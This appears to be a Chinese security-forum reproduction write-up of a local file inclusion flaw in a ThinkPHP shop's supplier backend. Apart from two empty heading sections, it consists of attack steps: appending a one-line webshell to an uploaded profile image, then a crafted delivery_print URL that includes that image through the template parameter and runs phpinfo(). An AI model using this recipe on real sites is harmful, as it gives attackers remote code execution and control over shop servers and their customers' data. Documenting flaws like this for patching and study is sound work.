# Thinkphp Shop 供应商后台本地文件包含导致权限提升

> 原文：[https://www.zhihuifly.com/t/topic/3182](https://www.zhihuifly.com/t/topic/3182)

# Thinkphp Shop 供应商后台本地文件包含导致权限提升

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

### 1、用户个人资料修改处上传图片

http://www.0-sec.org/Home/User/info.html

### 2、上传一张正常图片，并在图片末尾加上一句话

### 3、返回shell

http://www.0-sec.org/supplier/order/delivery_print?template=public/upload/user/4575/head_pic/5989ee42cc5992e64a60c52b0cbb7602.png&w=phpinfo();